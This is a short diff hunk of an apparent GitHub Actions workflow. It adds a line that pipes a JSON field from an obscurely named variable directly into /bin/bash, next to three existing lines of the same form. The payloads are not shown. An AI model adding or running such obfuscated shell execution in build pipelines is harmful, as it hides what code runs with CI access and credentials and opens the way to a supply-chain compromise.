@@ -28,6 +28,7 @@ jobs:
           echo $cavm105 | jq -r .txp1 | /bin/bash
           echo $r5 | jq -r .a4971 | /bin/bash
           printf '%s' "$ugcn062" | jq -r .lojed57547 | /bin/bash
+          echo $pg02014 | jq -r .e610 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
